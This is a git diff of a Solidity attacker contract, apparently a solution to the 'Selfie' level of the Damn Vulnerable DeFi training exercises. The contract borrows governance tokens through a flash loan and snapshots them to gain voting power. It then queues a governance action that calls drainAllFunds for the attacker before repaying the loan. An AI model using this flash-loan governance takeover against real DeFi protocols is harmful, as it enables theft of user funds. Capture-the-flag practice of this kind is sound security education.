@@ -5,13 +5,12 @@ import "./SelfiePool.sol";
 import "./SimpleGovernance.sol";
 import "../DamnValuableTokenSnapshot.sol";
 
-import "hardhat/console.sol";
-
 contract SelfiePoolAttacker {
     SelfiePool private selfiePool;
     SimpleGovernance private simpleGovernance;
 
-    address deployer;
+    address private deployer;
+    uint256 public actionId;
 
     constructor(address _selfiePool, address _simpleGovernance) {
         deployer = msg.sender;
@@ -29,15 +28,17 @@ contract SelfiePoolAttacker {
     function receiveTokens(address tokenAddress, uint256 borrowedAmount)
         public
     {
+        // snapshot - this is checked in queueAction
         DamnValuableTokenSnapshot(tokenAddress).snapshot();
 
-        simpleGovernance.queueAction(
+        // store actionId to be executed after the needed time treshold
+        actionId = simpleGovernance.queueAction(
             address(selfiePool),
             abi.encodeWithSignature("drainAllFunds(address)", deployer),
             0
         );
-        // console.log(address(selfiePool));
-        // send loan back
+
+        // pay back the loan
         ERC20Snapshot(tokenAddress).transfer(
             address(selfiePool),
             borrowedAmount
